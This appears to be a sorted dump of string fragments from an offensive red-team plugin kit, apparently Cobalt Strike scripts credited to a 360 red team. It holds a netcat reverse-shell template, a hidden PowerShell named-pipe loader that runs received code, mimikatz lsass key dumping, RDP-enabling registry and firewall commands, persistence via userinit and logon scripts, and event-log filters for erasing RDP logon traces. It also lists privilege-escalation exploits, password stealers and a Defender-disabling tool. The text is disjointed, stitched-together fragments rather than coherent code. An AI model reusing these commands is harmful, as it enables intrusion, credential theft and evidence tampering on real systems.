"""			      v0.6beta       By. Xiangshan@360RedTeam "
"""	"
"""            .NodeTypedValue = StrToBytes(sText, "
"""        .Charset = sTextEncoding"
"""        .Close"
"""        .DataType = "
"""        .Open"
"""        .Position = 0 "
"""        .Position = iBomByteCount "
"""        .Type = 1  "
"""        .Type = 2"
"""        .WriteText sText"
"""        Base64Encode = .Text"
"""        StrToBytes = .Read"
"""        else"
"""        end if"
"""        if fAsUtf16LE then"
"""      aBuf(I \ 2) = ChrW(Buf(I + 1) * 256 + Buf(I))"
"""    -allkeys     Use all DPAPI keys found in the credential store (not just the DPAPI keys found on this host)\n\n"
"""    -dump        Use mimikatz to dump DPAPI keys from lsass using Mimikatz's sekurlsa::dpapi\n"
"""    .Close"
"""    .Mode = 3: .Type = 1: .Open: .LoadFromFile FileName"
"""    .Position = 2: .CopyTo bStream: .Close"
"""    .Type = 2 : .Open: .WriteText aBuf"
"""    Else"
"""    End If"
"""    End With "
"""    End With"
"""    For I = 0 To .Size - 1: Buf(I) = AscB(.Read(1)): Next"
"""    If UCase(LoginUser) = "
"""    LoginUser = Empty"
"""    ReDim Buf(.Size - 1)"
"""    With CreateObject("
"""    \/  \/   |_|  |_|_____| |_|  |_/_/    \_\_____|_|\_\______|_|  \_\"
"""   $file"
"""   \  /\  /  | |  | |_| |_  | |  | |/ ____ \ |____| . \| |____| | \ \ "
"""  $+ $GETRES"
"""  $+ \"
"""  /cmd"
"""  >>  "
"""  Dim Buf(), I"
"""  Dim I, aBuf, Size, bStream"
"""  End With"
"""  For I = 0 To Size - 1 Step 2"
"""  GETRES?"
"""  If I = Size Then aBuf(I \ 2) = ChrW(Buf(I))"
"""  Next"
"""  ReadBinary = Buf"
"""  Set bStream = CreateObject("
"""  Set bStream = Nothing"
"""  Size = UBound(Buf): ReDim aBuf(Size \ 2)"
"""  With CreateObject("
"""  \ \/  \/ / | |\/| | | |   |  __  | / /\ \| |    |  < |  __| |  _  / "
"""  _-"
"""  aBuf=Join(aBuf, "
"""  bStream.SaveToFile FileName, 2: bStream.Close"
"""  bStream.Type = 1: bStream.Open"
"""  command"
"""  host"
""" "
""" $+ $File \"
""" $+ $NCpath  $+ $NCip  $+ $NCport -e cmd\"
""" $+ $Name\"
""" $+ $Path\"
""" $+ $oneliner $+ \"
""" $+ $path\"
""" $3['domain'] $3['user'] $3['pass']"
""" $3['filepath']"
""" $EventLogPath$EventLogName"
""" $RemoteComputer"
""" & "
""" & chr(34) & "
""" & chr(34) & Schedule_Name &chr(34)&"
""" & chr(34) & file & chr(34) & "
""" & chr(34) & file & chr(34) &"
""" & chr(34)"
""" & cmd & "
""" & objItem.Hour & "
""" & objItem.Minute & "
""" & vbTab & "
""" & vbTab & vbTab & "
""" &chr(34)& Schedule_Name &chr(34)&"
""" &chr(34)&"
""" ("
""" *.*"
""" + $MappedUserName) -Join "
""" + $Session) -Name "
""" + ' -Name ' + "
""" + '''; $fctenc = [System.Convert]::ToBase64String($fct); New-ItemProperty -Path ' + "
""" + (Get-Date -Format "
""" + (Split-Path -Leaf $UserObject."
""" , %(beacon => $1 , domain => "
""" , %(bid => $1['@'] , domain => "
""" , hash => "
""" , user => "
""" ,script_resource("
""" --Arguments \"
""" --Author $3['Author'] --Command \"
""" --GPOName \"
""" --UserAccount $3['UserAccount'] --GPOName \"
""" --rule=\"
""" -Context 0,$NumberOfPrivateKeyLines).Context.PostContext -Join "
""" -a \"
""" -command $Command"
""" -f $(Bitmap-Read -Address $($NextProcess+$TokenOffset)))"
""" -f $(Bitmap-Read -Address $($SysEPROCESS+$TokenOffset)))"
""" -f $(Bitmap-Read -Address $SysEprocessPtr))"
""" -f $NextProcess)"
""" -f $ProcessInfo.dwProcessId)`n"
""" -f $SysEprocessPtr)"
""" -m add -o $3['schtask_time']"
""" -m add"
""" -n \"
""" -or !$RDPFileObject."
""" -or $RDPFileObject."
""" . $mypipe . "
""" . $sha1, $Domain, "
""" . $url . "
""" . binfo($1,"
""" . join("
""" . listener_describe($3['listener']) . "
""" /d 1 /t REG_DWORD"
""" /domain"
""" /f "
""" /q:"
""" /v UserInitMprLogonScript /t REG_SZ /d \"
""" /v \"
""" /v fDenyTSConnections /t REG_DWORD /d 0 /f\'"
""" /v fDenyTSConnections /t REG_DWORD /d 1 /f\'"
""" 1"
""" = "
""" = try { (Select-String -Path $Path -Pattern "
""" => "
""" > "
""" Adobedll.dll; rundll32.exe Adobedll.dll,StartW"
""" And pass = "
""" C:\\Windows\\system32\\userinit.exe, $+ $File \"
""" EfsPotato"
""" Else sTextEncoding = "
""" FullPowers"
""" JuicyPotato (ms16-075)"
""" MS16-135"
""" PrintSpoofer"
""" SweetPotato (ms16-075)"
""" Then"
""" \ \  /\  / /| \  / | | |   | |__| |  /  \ | |    | ' /| |__  | |__) |"
""" \"
""" add-type -assemblyName `'System.Core`';`$npipeClient = new-object System.IO.Pipes.NamedPipeClientStream(`'.`', `'$npipeName`', [System.IO.Pipes.PipeDirection]::InOut,[System.IO.Pipes.PipeOptions]::None,[System.Security.Principal.TokenImpersonationLevel]::Impersonation);`$pipeReader = `$pipeWriter = `$null;`$playerName = `'ping`';`$npipeClient.Connect();`$pipeWriter = new-object System.IO.StreamWriter(`$npipeClient);`$pipeReader = new-object System.IO.StreamReader(`$npipeClient);`$pipeWriter.AutoFlush = `$true;`$pipeWriter.WriteLine(`$playerName);IEX `$pipeReader.ReadLine();`$npipeClient.Dispose();"
""" binpath= \"
""" cve-2020-0796"
""" eventname=$3['eventname'] attime=$3['attime'] "
""" key=clear"
""" lnkicon=\"
""" lnkname=\"
""" lnkpath=\"
""" lnktarget=\"
""" ms14-058"
""" ms15-051"
""" ms16-016"
""" ms16-032"
""" not supported for cpu option "
""" protocol=TCP dir=in localport=3389 action=allow"
""" protocol=TCP dir=in localport=3389 action=allow\'"
""" start= auto&&net start  $+ $Name"
""" to dump the masterkeys on the current machine from lsass.exe"
""" to dump the masterkeys on the current machine from lsass.exe\n"
""" to use all DPAPI keys found in the credential store."
""" via RottenPotato (ms16-075)"
""" via cve-2019-0803"
""" | findstr \"
""" || lc($3) eq "
""""" & chr(34) & "
""""" &chr(34)&"
""""" | Select-Object -Property "
""""""
"""""$"
""""", "
""""", chr(34) & "
""""", pass => "
""""", vkey => "
""""",,type => "
""""",GPOName => "
""""",arguments => "
""""",cmd => "
""""",domain => "
""""",hostname => "
""""",localpath => "
""""",pass => "
""""",passwd => "
""""",password => "
""""",path => "
""""",remotepath => "
""""",type => "
""""",user => "
""""",username => "
"""##  ApplockerEnumerating-AppLocker           ##"
"""##  LAPS-Existance of LAPS                   ##"
"""##############"
"""###############"
"""#################"
"""###################"
"""####################"
"""#####################"
"""######################"
"""#######################"
"""########################"
"""#########################"
"""##########################"
"""#############################"
"""##############################"
"""################################"
"""#################################"
"""###################################"
"""###############################################"
"""####################################################"
"""#text"
"""$($OSVersion.Major).$($OSVersion.Minor)"
"""$1\"
"""$3['Arguments']\"
"""$3['Command']\"
"""$3['GPOName']\"
"""$3['Keyword']\"
"""$3['ScriptContents']\"
"""$3['Taskname']\"
"""$3['UserRights']\"
"""$3['cmd']"
"""$3['command']\"
"""$3['computername']"
"""$3['filename'] /Q /NORESTART /lcid 1033"
"""$3['filepath']\"
"""$3['groupname']"
"""$3['lnkicon']\"
"""$3['lnkname']\"
"""$3['lnkpath']\"
"""$3['lnktarget']\"
"""$3['modifytime']\"
"""$3['path'] $3['outpath']"
"""$3['path']"
"""$3['path']\"
"""$3['payload']\"
"""$3['schtask_name']\"
"""$3['schtasks_description']\"
"""$3['service_name']\"
"""$3['target'] $3['service'] \"
"""$3['type']"
"""$Env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe"
"""$EventRecordID"
"""$File"
"""$IpAddress"
"""$KernelType"
"""$SID"
"""$command\"
"""$exec"
"""$fname\"
"""$guid:$masterkey"
"""$localpath\"
"""$msg\"
"""$output"
"""$pass\"
"""$remotepath\"
"""%4"
"""%hs"
"""&&sc config \"
"""&Chr(34)&file&chr(34)&"
"""&cmd&"
"""&cmd&chr(34)&"
"""&exec_time&"
"""&file&"
"""&secquan.org@panda8"
"""&t00ls.com@panda8"
"""&xway.cn@panda8"
"""' + $remote_command + '"
"""' . $1 . '"
"""'$fullregistrypath'"
"""'$registrydownname'"
"""')]]"
"""(Hostname)"
"""(objectCategory=$strCategory)"
""") + "
""") , lambda({ bdcsync($3["
""") -Name "
""") . "
""") CALL SetAllowTSConnections 0"
""") CALL SetAllowTSConnections 1"
""")"
"""), "
"""), $2, "
"""), $args, "
"""), $pipename, "
"""), $stager, "
"""),' \*',"
"""),port => "
""").CreateElement("
"""********"
"""*8.8.8.8:3389"
"""*[EventData[(Data[@Name='IpAddress']!='"
"""*[System[(EventID !='1024')]]"
"""*[System[(EventID !='1149')]]"
"""*[System[(EventID !='131') and (EventID !='140')]]"
"""*[System[(EventID !='21') and (EventID !='22') and (EventID !='24') and (EventID !='25')]]"
"""*[System[(EventID=21) or (EventID=22) or (EventID=24) or (EventID=25)]]"
"""*[System[(EventRecordID!='"
"""+ $Target + "
"""+"
"""+$User.Name+"
"""+$User.SID+"
""",  "
""", "
""", $Domain, "
""", $help, "
""", %(EventLogType => "
""", %(OutFile => "
""", %(Path => "
""", %(ScriptName => "
""", %(Taskname => "
""", %(Type => "
""", %(UploadPath => "
""", %(UserAccount => "
""", %(UserRights => "
""", %(args => "
""", %(bid => $1['@'] , domain => "
""", %(cmd => "
""", %(command => "
""", %(computername => "
""", %(content => "
""", %(domain => "
""", %(downPath => "
""", %(filename => "
""", %(filepath => "
""", %(host => "
""", %(ip => "
""", %(iptype => "
""", %(name => "
""", %(passwd => "
""", %(path => "
""", %(payload => "
""", %(port => "
""", %(servicename => "
""", %(sessionpath => "
""", %(target => "
""", %(type => "
""", %(url => "
""", %(user => "
""", 2)"
""", 3)"
""", @("
""", CallBackFile => "
""", EntryPoint="
""", GETRES => "
""", HKEY_LOCAL_MACHINE, "
""", Path => "
""", RegItem => "
""", ["
""", arrData)"
""", command => "
""", hex => "
""", localpath => "
""", pass => "
""", password => "
""", port => "
""", remotepath => "
""", rhost => "
""", taskDefinition, 6, LoginUser, , 3)"
""", thread => "
""", type => "
""", user => "
""", username => "
""", { url_open("
""","
""",$3['Sleep'],"
""",$3['cmdpath'],"
""",$3['computername'],"
""",$3['domain'],"
""",$3['filename'],"
""",$3['host'],"
""",$3['ip'],"
""",$3['localpath'],"
""",$3['outfile'],"
""",$3['pass'],"
""",$3['password'],$3['type'],"
""",$3['ports'],"
""",$3['thread'],"
""",$3['type'],"
""",$3['url'],"
""",$3['user'],"
""",$3['username'],"
""",%(NCpath => "
""",%(RegKey => "
""",%(SerName => "
""",%(Type => "
""",%(exec => "
""",%(host => "
""",%(ip => "
""",%(lhost => "
""",%(server => "
""",%(targets => "
""",%(user => "
""",0)"
""",1)"
""",Arguments => "
""",Author => "
""",Command => "
""",Delay => "
""",GPOName => "
""",Keyword => "
""",NCip => "
""",NCport => "
""",ScriptContents => "
""",Sleep => "
""",UserAccount => "
""",args => "
""",attime => "
""",b64_content)"
""",cmd => "
""",cmdpath => "
""",command => "
""",domain => "
""",enable => "
""",eventname => "
""",file => "
""",filepath => "
""",group => "
""",groupname => "
""",groups => "
""",ip => "
""",ip => beacon_info($bid,"
""",lnkicon => "
""",lnkname => "
""",lnkpath => "
""",lnktarget => "
""",localpath => "
""",modifytime => "
""",outfile => "
""",outpath => "
""",pass => "
""",passwd => "
""",path => "
""",payload => "
""",permission => "
""",port => "
""",ports => "
""",schtask_name => "
""",schtask_time => "
""",schtasks_description => "
""",schtasks_name => "
""",service => "
""",service_name => "
""",sheetname => "
""",sid => "
""",strValue"
""",thread => "
""",time => "
""",type => "
""",url => "
""",user => "
"""-"
"""----------------------------------"
"""--AddComputerTask --TaskName \"
"""--AddLocalAdmin --UserAccount $3['UserAccount'] --GPOName \"
"""--AddTask $3['host'] $3['time'] \\ $3['schtasks_name'] \"
"""--AddUserRights --UserRights \"
"""--AddUserScript --ScriptName $3['ScriptName'] --ScriptContents \"
"""--Delay"
"""--GetRunning $3['host']"
"""--ListAll $3['host'] \\"
"""--Passwords"
"""--RemoveTask $3['host'] \\ $3['schtasks_name']"
"""--Seeds"
"""--Sleep"
"""--action GET_POLICIES"
"""--enableHistory"
"""-4624"
"""-4625"
"""-AV"
"""-All"
"""-AllUserDirectories"
"""-ApplockerEnumerating"
"""-AvProcessEDRproduct"
"""-CIP"
"""-CsharpVersion"
"""-Defender"
"""-Downgrade True -Verbose True"
"""-Drives"
"""-EnvironmentalVariables"
"""-FileZilla"
"""-Foxmail"
"""-GetRecycle"
"""-IP"
"""-KB"
"""-LAPS"
"""-Navicat"
"""-NetworkConnentions"
"""-OutFile"
"""-Pass2User"
"""-Password"
"""-PowershellInfo"
"""-RealVNC"
"""-RecentFiles"
"""-TeamViewer"
"""-TortoiseSVN"
"""-User2Pass"
"""-Username"
"""-WinSCP"
"""-Xmanager"
"""-allkeys"
"""-b"
"""-c"
"""-c="
"""-d"
"""-d="
"""-dns"
"""-dns/-http/all"
"""-dump"
"""-e"
"""-e="
"""-f="
"""-g"
"""-group="
"""-group=$3['Type'] -outputfile=\"
"""-h"
"""-host"
"""-http"
"""-i"
"""-i="
"""-ip/-cip"
"""-l 6363 "
"""-m="
"""-mssql"
"""-mysql"
"""-mysql/-mssql"
"""-o"
"""-p $program "
"""-p"
"""-p="
"""-query"
"""-rdp0"
"""-rdp1"
"""-s $3['filepath'] -t \"
"""-s $shellcode"
"""-sp"
"""-t schtask -c \"
"""-t schtaskbackdoor -c \"
"""-t service -c \"
"""-t"
"""-u"
"""-u="
"""-v"
"""-xp"
"""-xp/-sp"
"""."
""".$Pwd."
""".$dll), $stager, "
"""..."
""".\"
""".cmd"
""".evtx"
""".ppk"
""".rdp"
""".sdtid"
"""/"
"""/CVE-2020-0796.x64.dll"
"""/c "
"""/c $3['payload']\"
"""/c powershell.exe -nop -w hidden -c \"
"""/cmd"
"""/download"
"""/modules/aggressor"
"""/path:$3['path']"
"""/script/0803.exe"
"""/script/360bowser.exe"
"""/script/ATPMiniDump.exe"
"""/script/BypassAddUser.exe"
"""/script/CredPhisher.exe"
"""/script/EfsPotato.exe"
"""/script/EncryptedZIP.exe"
"""/script/FakeLogonScreen.exe"
"""/script/FullPowers.dll"
"""/script/InternalMonologue.exe"
"""/script/Invoke-MS16032.ps1"
"""/script/Invoke-MS16135.ps1"
"""/script/JuicyPotato.x64.dll"
"""/script/JuicyPotato.x86.dll"
"""/script/Ladon.exe"
"""/script/Ladon1.exe"
"""/script/ListAllUsers.ps1"
"""/script/ListLogged-inUsers.ps1"
"""/script/LocalSessionManager.ps1"
"""/script/MaceTrap.exe"
"""/script/Net-GPPPassword.exe"
"""/script/NoPowerShell.exe"
"""/script/Recon-AD-AllLocalGroups.dll"
"""/script/Recon-AD-Computers.dll"
"""/script/Recon-AD-Domain.dll"
"""/script/Recon-AD-Groups.dll"
"""/script/Recon-AD-LocalGroups.dll"
"""/script/Recon-AD-SPNs.dll"
"""/script/Recon-AD-Users.dll"
"""/script/ReflectiveDll.x64.dll"
"""/script/RegRdpPort.ps1"
"""/script/RottenPotato/"
"""/script/SPNSearcher.exe"
"""/script/SafetyKatz.exe"
"""/script/Seatbelt.exe"
"""/script/SessionGopher.ps1"
"""/script/SharPersist.exe"
"""/script/Sharp3389.exe"
"""/script/SharpAVKB.exe"
"""/script/SharpBypassUAC.exe"
"""/script/SharpChassisType.exe"
"""/script/SharpCheckInfo.exe"
"""/script/SharpClipHistory.exe"
"""/script/SharpCloud.exe"
"""/script/SharpDecryptPwd.exe"
"""/script/SharpDecryptPwd2.exe"
"""/script/SharpDir.exe"
"""/script/SharpDirLister.exe"
"""/script/SharpDomainSpray.exe"
"""/script/SharpDomainSpray/SharpDomainSpray.exe"
"""/script/SharpDoor.exe"
"""/script/SharpEDRChecker.exe"
"""/script/SharpEventLog.exe"
"""/script/SharpExcelibur.exe"
"""/script/SharpExec.exe"
"""/script/SharpGPOAbuse.exe"
"""/script/SharpGetTitle.exe"
"""/script/SharpHide.exe"
"""/script/SharpHound.exe"
"""/script/SharpNetCheck.exe"
"""/script/SharpOXID-Find.exe"
"""/script/SharpSCshell.exe"
"""/script/SharpSQLDump.exe"
"""/script/SharpSQLTools.exe"
"""/script/SharpShares.exe"
"""/script/SharpSpray.exe"
"""/script/SharpStay.exe"
"""/script/SharpTask.exe"
"""/script/SharpWebScan.exe"
"""/script/SharpXDecrypt.exe"
"""/script/SharpZip.exe"
"""/script/SpoolTrigger.x64.dll"
"""/script/SpoolTrigger.x86.dll"
"""/script/Stealer.exe"
"""/script/SweetPotato.exe"
"""/script/Telemetry.exe"
"""/script/WMIHACKER.vbs"
"""/script/Watson.exe"
"""/script/blocketw.exe"
"""/script/chfs.exe"
"""/script/crack.exe"
"""/script/cve-2014-4113.x64.dll"
"""/script/cve-2014-4113.x86.dll"
"""/script/cve-2015-1701.x64.dll"
"""/script/cve-2015-1701.x86.dll"
"""/script/cve-2016-0051.x86.dll"
"""/script/dazzleUP_Reflective_DLL.x64.dll"
"""/script/dis_defender.exe"
"""/script/hack-browser-data.exe"
"""/script/iox.exe"
"""/script/lazagne.exe"
"""/script/noNetApiAdd.exe"
"""/script/scout.exe"
"""/script/scrying.exe"
"""/script/sharpwmi.exe"
"""/script/x64/PrintSpoofer.dll"
"""/script/x64/PrintSpoofer.exe"
"""/script/x64/frpc.exe"
"""/script/x64/fscan.exe"
"""/script/x64/nc.exe"
"""/script/x64/npc.exe"
"""/script/x86/PrintSpoofer.dll"
"""/script/x86/PrintSpoofer.exe"
"""/script/x86/frpc.exe"
"""/script/x86/fscan.exe"
"""/script/x86/npc.exe"
